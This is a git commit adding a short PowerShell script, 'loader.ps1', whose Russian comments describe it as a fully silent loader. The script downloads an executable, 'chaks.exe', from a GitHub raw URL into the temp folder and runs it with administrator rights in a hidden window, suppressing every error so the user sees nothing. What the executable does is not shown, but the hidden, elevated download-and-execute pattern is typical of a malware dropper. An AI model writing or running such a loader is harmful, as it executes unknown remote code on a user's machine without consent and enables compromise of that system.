b2bc343241aca5ecbeca14d1339013afb9d24bc5
RecentFiles <pyroflarex@gmail.com>
2026-04-05 21:16:06 +0300

    Add files via upload

---
+++ loader.ps1
@@ -0,0 +1,16 @@
+﻿# Полностью тихий загрузчик
+$ErrorActionPreference = 'SilentlyContinue'
+
+$url = 'https://github.com/RecentFiles/ModSz25az/raw/refs/heads/main/chaks.exe'
+$out = [System.IO.Path]::GetTempPath() + 'chaks.exe'
+
+try {
+    # Скачиваем файл
+    Invoke-WebRequest -Uri $url -OutFile $out -UseBasicParsing -ErrorAction Stop
+    
+    # Запускаем от имени администратора (без окна)
+    Start-Process -FilePath $out -Verb RunAs -WindowStyle Hidden
+}
+catch {
+    # Если ошибка — ничего не показываем
+}
